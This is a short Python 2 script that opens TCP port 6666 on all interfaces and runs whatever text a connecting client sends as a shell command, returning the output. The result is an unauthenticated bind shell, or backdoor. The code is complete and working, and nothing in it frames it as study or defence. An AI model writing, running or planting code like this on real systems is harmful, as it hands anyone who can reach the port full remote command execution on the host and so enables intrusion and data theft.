# coding:utf-8
from socket import *
from os import *

s = socket(AF_INET,SOCK_STREAM)
s.bind(('',6666))
s.listen(1)
while True:
	sock,addr = s.accept()
	print 'Connected by ',addr
	while True:
		cmd = sock.recv(1024)
		if cmd == 'exit':
			sock.close()
			break
		result = popen(cmd).read()
		sock.send(result)
